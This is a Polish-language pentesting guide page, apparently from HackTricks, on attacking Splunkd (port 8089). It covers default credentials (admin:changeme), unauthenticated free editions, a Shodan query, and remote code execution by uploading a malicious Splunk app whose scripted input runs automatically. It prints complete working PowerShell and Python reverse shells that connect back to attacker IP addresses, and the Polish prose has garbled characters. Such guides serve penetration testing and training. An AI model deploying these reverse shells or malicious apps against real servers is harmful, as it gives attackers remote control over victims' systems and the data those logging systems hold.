# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

* Narzdzie do analizy log贸w u偶ywane do zbierania, analizy i wizualizacji danych
* Powszechnie u偶ywane w monitorowaniu bezpieczestwa i analizie biznesowej
* Domylne porty:
* Serwer WWW: 8000
* Usuga Splunkd: 8089

### Wektory podatnoci:

1. Wykorzystanie wersji darmowej

* Wersja pr贸bna automatycznie przeksztaca si w wersj darmow po 60 dniach
* Wersja darmowa nie ma uwierzytelnienia
* Potencjalne ryzyko bezpieczestwa, jeli pozostawiona bez nadzoru
* Administratorzy mog przeoczy implikacje bezpieczestwa

2. Saboci w powiadczeniach

* Starsze wersje: Domylne powiadczenia `admin:changeme`
* Nowsze wersje: Powiadczenia ustawiane podczas instalacji
* Potencja do u偶ycia sabych hase (np. `admin`, `Welcome`, `Password123`)

3. Mo偶liwoci zdalnego wykonania kodu

* Wiele metod wykonania kodu:
* Aplikacje Django po stronie serwera
* Punkty kocowe REST
* Skrypty wejciowe
* Skrypty powiadomie
* Wsparcie dla wielu platform (Windows/Linux)
* Skrypty wejciowe mog uruchamia:
* Skrypty Bash
* Skrypty PowerShell
* Skrypty wsadowe

Kluczowy potencja wykorzystania:

* Przechowywanie wra偶liwych danych
* Brak uwierzytelnienia w wersji darmowej
* Wiele wektor贸w potencjalnego zdalnego wykonania kodu
* Mo偶liwo wykorzystania skrypt贸w wejciowych do kompromitacji systemu

### Shodan

* `Splunk build`

## RCE

### Utw贸rz niestandardow aplikacj

Splunk oferuje zaawansowan metod zdalnego wykonania kodu poprzez wdra偶anie niestandardowych aplikacji, wykorzystujc swoje mo偶liwoci skryptowe na wielu platformach. G贸wna technika wykorzystania polega na stworzeniu zoliwej aplikacji, kt贸ra mo偶e wykonywa odwrotne powoki na systemach Windows i Linux.

Niestandardowa aplikacja mo偶e uruchamia **skrypty Python, Batch, Bash lub PowerShell**. Co wicej, **Splunk ma zainstalowanego Pythona**, wic nawet w systemach **Windows** bdziesz m贸g uruchamia kod Pythona.

Mo偶esz u偶y [**tego**](https://github.com/0xjpuff/reverse_shell_splunk) przykadu z **`bin`** zawierajcym przykad dla [Pythona](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Lub mo偶esz stworzy wasny.

Proces wykorzystania pod偶a za sp贸jn metodologi na r贸偶nych platformach:
```
splunk_shell/
 bin        (reverse shell scripts)
 default    (inputs.conf configuration)
```
Plik konfiguracyjny `inputs.conf` wcza skrypt poprzez:

* Ustawienie `disabled = 0`
* Skonfigurowanie 10-sekundowego interwau wykonania
* Zdefiniowanie typu 藕r贸dowego skryptu

Wdro偶enie jest proste:

1. Utw贸rz zoliwy pakiet aplikacji
2. Skonfiguruj nasuchiwacz (Netcat/socat) na maszynie atakujcej
3. Przelij aplikacj przez interfejs Splunk
4. Wyzw贸l automatyczne wykonanie skryptu po przesaniu

Przykadowy odwr贸cony shell PowerShell w systemie Windows:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Przykadowy odwr贸cony shell Python w systemie Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacja Uprawnie

Na nastpnej stronie znajdziesz wyjanienie, jak ta usuga mo偶e by nadu偶ywana do eskalacji uprawnie i uzyskania trwaoci:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Odniesienia

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
